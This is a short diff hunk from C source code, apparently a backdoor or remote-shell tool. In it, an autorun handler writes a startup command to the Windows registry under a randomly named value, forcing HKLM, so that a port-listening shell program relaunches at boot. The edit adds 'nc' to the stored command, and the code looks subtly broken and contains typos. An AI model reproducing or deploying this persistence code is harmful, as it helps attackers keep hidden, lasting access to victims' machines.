@@ -649,7 +649,7 @@ static int autorun_handler(int s, int argc, char* argv[])
 	if (hKey) {
 		name = get_exe_name();
 		regv = get_randon_str();
-		sprintf(cmd, "%s -%c %d", name, type, port);
+		sprintf(cmd, "%s nc -%c %d", name, type, port);
 		SHRegWriteUSValue(hKey, regv, REG_SZ, cmd, strlen(cmd), SHREGSET_FORCE_HKLM);
 		SHRegCloseUSKey(hKey);
 		xshell_printf(s, "Succecced. Name: %s\n", regv);
